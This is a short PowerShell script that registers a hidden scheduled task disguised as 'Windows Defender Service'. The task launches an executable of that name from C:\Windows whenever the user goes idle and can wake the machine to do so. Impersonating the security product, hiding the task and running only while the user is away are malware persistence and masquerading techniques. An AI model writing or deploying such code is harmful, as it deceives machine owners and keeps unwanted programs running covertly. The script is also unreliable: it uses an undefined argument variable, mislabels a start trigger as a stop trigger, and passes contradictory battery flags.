# Task Name and Action
$TaskName = "Windows Defender Service"
$ActionPath = "C:\Windows\Windows Defender Service.exe" # Path to Windows Defender Service

# Idle Conditions
$IdleTime = 1 # Idle time in minutes
$WaitTimeout = 1 # wait timeout in minutes

# Create the Scheduled Task Action
$Action = New-ScheduledTaskAction -Execute $ActionPath -Argument $ActionArguments

# Create the Scheduled Task Trigger (Idle)
$IdleTrigger = New-ScheduledTaskTrigger -Idle -IdleTime $IdleTime -WaitTimeout $WaitTimeout

# Create the Scheduled Task Trigger (Stop on IdleEnd)
$IdleEndTrigger = New-ScheduledTaskTrigger -Event -Subscription "<QueryList><Query Id='0' Path='System'><Select Path='System'>*[System[Provider[@Name='Microsoft-Windows-User Profile Service'] and (EventID=2)]]</Select></Query></QueryList>"

# Create the Scheduled Task Settings
$Settings = New-ScheduledTaskSettingsSet -AllowDemandStart -Hidden -StopIfGoingOnBatteries -DontStopIfGoingOnBatteries -WakeToRun -StartWhenAvailable -RunOnlyIfNetworkAvailable

# Create the Scheduled Task Principal
$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -LogonType Interactive

# Create the Scheduled Task
$Task = New-ScheduledTask -Action $Action -Trigger $IdleTrigger,$IdleEndTrigger -Settings $Settings -Principal $Principal

# Register the Scheduled Task
Register-ScheduledTask -TaskName $TaskName -InputObject $Task
